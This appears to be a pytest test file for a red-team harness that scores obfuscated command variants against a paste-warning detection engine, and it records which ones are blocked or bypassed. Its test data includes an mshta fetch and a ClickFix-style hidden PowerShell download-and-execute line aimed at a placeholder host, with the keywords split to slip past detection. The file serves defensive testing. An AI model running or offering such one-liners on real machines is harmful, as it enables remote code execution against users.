import os
import sys

import pytest

from redteam import engine
from redteam.models import Shell, Variant
from redteam.mutate import _kw

STUB = """
ENGINE_VERSION = '0.0.0-stub'
CALLS = []

def analyze(text, locale='zh-TW'):
    if text == 'boom':
        raise ValueError('secret detail ' + text)
    bad = ('ms' + 'hta') in text
    return {
        'schema': 1,
        'action': 'quarantine' if bad else 'allow',
        'command': {
            'level': 'malicious' if bad else 'none',
            'risk_score': 90 if bad else 0,
            'reasons': [{'id': 'cmd-reason-x', 'text': 'x'}] if bad else [],
        },
        'hidden': {'level': 'none', 'reasons': []},
    }
"""


@pytest.fixture
def stub_build(tmp_path):
    (tmp_path / 'paste_warden.py').write_text(STUB)
    return engine.EngineBuild(
        rules_rev='stub', python=sys.executable, extra_path=(str(tmp_path),)
    )


def v(payload, vid):
    return Variant(
        id=vid,
        seed_id='s',
        round=1,
        generator='g0',
        techniques=('cmd.caret',),
        shell=Shell.CMD,
        payload=payload,
    )


def test_worker_protocol(stub_build):
    bad = 'ms' + 'hta https://example.invalid/a'
    verdicts = engine.score(
        [v(bad, 'a'), v('echo hi', 'b'), ('benign-1', 'git status')],
        stub_build,
    )
    assert [x.variant_id for x in verdicts] == ['a', 'b', 'benign-1']
    assert verdicts[0].action == 'quarantine'
    assert verdicts[0].outcome == 'blocked'
    assert verdicts[0].reason_ids == ('cmd-reason-x',)
    assert verdicts[0].rules_rev == 'stub'
    assert verdicts[1].outcome == 'bypassed'
    assert all(x.duration_us >= 0 for x in verdicts)
    assert engine.score([], stub_build) == []


def test_worker_error_has_no_payload(stub_build):
    with pytest.raises(engine.EngineError) as e:
        engine.score([('x', 'boom')], stub_build)
    assert 'boom' not in str(e.value)
    assert 'ValueError' in str(e.value)


def test_worker_reads_parts_not_raw_text():
    assert "''.join(item['parts'])" in engine.WORKER_SRC
    assert 'print(' not in engine.WORKER_SRC


def test_percentile_and_latency():
    assert engine.percentile([], 99) == 0
    assert engine.percentile([5], 99) == 5
    vals = list(range(1, 101))
    assert engine.percentile(vals, 50) == 50
    assert engine.percentile(vals, 99) == 99
    assert engine.percentile(vals, 100) == 100


def test_resolve_rev():
    sha = engine.resolve_rev('HEAD')
    assert len(sha) == 40


@pytest.mark.skipif(
    os.environ.get('REDTEAM_ENGINE_TESTS') != '1',
    reason='builds the real wheel; set REDTEAM_ENGINE_TESTS=1',
)
def test_score_current_real_engine():
    clickfix = ''.join(
        [_kw.PS, ' -w hidden -c "', _kw.IEX, '(', _kw.IWR]
        + [" 'https://example.invalid/a')\""]
    )
    verdicts = engine.score_current([('m', clickfix), ('b', 'echo hello')])
    assert verdicts[0].action == 'quarantine'
    assert verdicts[1].action == 'allow'
    assert engine.latency(verdicts)['p99_us'] > 0
